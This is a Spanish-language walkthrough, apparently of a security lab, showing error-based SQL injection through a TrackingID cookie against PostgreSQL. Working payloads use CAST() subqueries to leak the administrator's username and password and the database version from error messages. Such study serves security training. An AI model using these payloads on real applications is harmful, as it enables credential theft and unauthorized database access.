# **Visible Error-Based SQL Injection en PostgreSQL/MySQL Databases**  

Este tipo de ataque aprovecha los mensajes de error visibles que la base de datos devuelve en las respuestas HTTP. A diferencia del Blind SQL Injection, aquí podemos leer directamente los errores generados, lo que nos permite extraer información de manera más rápida y precisa.  

El flujo del ataque sigue estos pasos:  

1. **Confirmar la vulnerabilidad**  
2. **Identificar el motor de base de datos**  
3. **Listar información sensible a partir de los errores**  

---

## **1. Confirmar la Vulnerabilidad en el Parámetro TrackingID**  

El parámetro `TrackingID` se usa en una consulta SQL que probablemente tenga la siguiente forma:  

```sql
SELECT * FROM tracking WHERE id = 'input'
```  

Para verificar si es vulnerable a SQL Injection, probamos con una comilla simple:  

- **Prueba 1:**  
  ```sql
  TrackingID=V03gUv2TBm3wvMMD'
  ```
  - **Respuesta:** HTTP **500 Internal Server Error**  
  - **Mensaje de error:**  
    ```sql
    Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'V03gUv2TBm3wvMMD''. Expected char
    ```
  - **Explicación:** Se rompe la consulta porque la comilla simple no está escapada, lo que indica que podría ser vulnerable a SQL Injection.  

- **Prueba 2:**  
  ```sql
  TrackingID=V03gUv2TBm3wvMMD''
  ```
  - **Respuesta:** HTTP **200 OK**  
  - **Explicación:** Al agregar dos comillas (`''`), se cierra correctamente la cadena en SQL, confirmando que la entrada no está siendo escapada adecuadamente.  

---

## **2. Identificar el Motor de Base de Datos**  

Para determinar qué base de datos se está utilizando, probamos con concatenaciones:  

- **Prueba 1:**  
  ```sql
  TrackingID=V03gUv2TBm3wvMMD'||(SELECT '')||'
  ```
  - **Respuesta:** HTTP **200 OK**  
  - **Explicación:** Esta concatenación es válida en algunos motores como PostgreSQL y MySQL.  

- **Prueba 2:**  
  ```sql
  TrackingID=V03gUv2TBm3wvMMD'||(SELECT ')||'
  ```
  - **Respuesta:** HTTP **500 Internal Server Error**  
  - **Mensaje de error:**  
    ```sql
    Unterminated string literal started at position 67 in SQL SELECT * FROM tracking WHERE id = 'V03gUv2TBm3wvMMD'||(SELECT ')||''. Expected char
    ```
  - **Explicación:** La concatenación está mal cerrada, lo que genera un error de sintaxis.  

- **Conclusión:**  
  - No es **OracleDB**, ya que **no** se requiere `FROM dual`.  
  - Es **MySQL o PostgreSQL**, ya que la concatenación con `||` es aceptada.  

---

## **3. Extracción de Información Utilizando CAST()**  

El uso de `CAST()` nos permite forzar errores visibles que contienen información sensible.  

### **Uso de CAST() para Confirmar la Inyección**  

- **Prueba con una consulta simple:**  
  ```sql
  TrackingID=V03gUv2TBm3wvMMD' and 1=CAST((select 1) as int)--
  ```
  - **Respuesta:** HTTP **200 OK**  
  - **Explicación:**  
    - `1=CAST((SELECT 1) AS int)` se evalúa correctamente, por lo que la consulta se ejecuta sin errores.  
    - Esto confirma que podemos usar `CAST()` para extraer información.  

---

### **Identificar el Nombre de Usuario en la Base de Datos**  

- **Prueba con `username` en la tabla `users`:**  
  ```sql
  TrackingID=V03gUv2TBm3wvMMD' and 1=CAST((select username from users) as int)--
  ```
  - **Respuesta:** HTTP **500 Internal Server Error**  
  - **Mensaje de error:**  
    ```sql
    Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'V03gUv2TBm3wvMMD' and 1=CAST((select username from users) as'. Expected char
    ```
  - **Explicación:**  
    - La consulta parece truncada, posiblemente debido a un **límite de caracteres** en la cookie.  

- **Solución:** Eliminar valores innecesarios para hacer espacio en la consulta:  
  ```sql
  TrackingID=' and 1=CAST((select username from users) as int)--
  ```
  - **Nuevo error:**  
    ```sql
    ERROR: more than one row returned by a subquery used as an expression
    ```
  - **Explicación:**  
    - El subquery `SELECT username FROM users` devuelve múltiples filas, lo que causa un error.  
    - Necesitamos limitar el resultado a una sola fila.  

- **Solución usando `LIMIT 1`:**  
  ```sql
  TrackingID=' and 1=CAST((select username from users limit 1) as int)--
  ```
  - **Nuevo error:**  
    ```sql
    ERROR: invalid input syntax for type integer: "administrator"
    ```
  - **Explicación:**  
    - El error revela que la primera entrada en `users.username` es **"administrator"**.  

---

### **Extraer la Contraseña del Usuario Administrator**  

- **Prueba con `password`:**  
  ```sql
  TrackingID=' and 1=CAST((select password from users limit 1) as int)--
  ```
  - **Nuevo error:**  
    ```sql
    ERROR: invalid input syntax for type integer: "zpv5dpjtn2ji7mqu93es"
    ```
  - **Explicación:**  
    - Se obtiene la contraseña del primer usuario: **"zpv5dpjtn2ji7mqu93es"**.  

---

## **4. Confirmar el Motor de Base de Datos**  

Para confirmar si es PostgreSQL o MySQL, consultamos la versión:  

```sql
TrackingID=' and 1=CAST((select version()) as int)--
```
- **Respuesta:** HTTP **500 Internal Server Error**  
- **Mensaje de error:**  
  ```sql
  ERROR: invalid input syntax for type integer: "PostgreSQL 12.20 (Ubuntu 12.20-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
  ```
- **Explicación:**  
  - El mensaje de error revela que la base de datos es **PostgreSQL 12.20**.  

---

## **Conclusión**  

Este ataque de **Visible Error-Based SQL Injection** permitió extraer información directamente de los mensajes de error visibles en PostgreSQL:  

✔️ Confirmamos la vulnerabilidad en el parámetro `TrackingID`.  
✔️ Identificamos PostgreSQL como el motor de base de datos.  
✔️ Extraímos el primer usuario (`administrator`) y su contraseña (`zpv5dpjtn2ji7mqu93es`).  

Este tipo de SQL Injection es altamente efectivo cuando la aplicación muestra los errores de la base de datos en las respuestas HTTP, permitiendo la extracción de datos sin necesidad de técnicas más avanzadas como Blind SQLi.
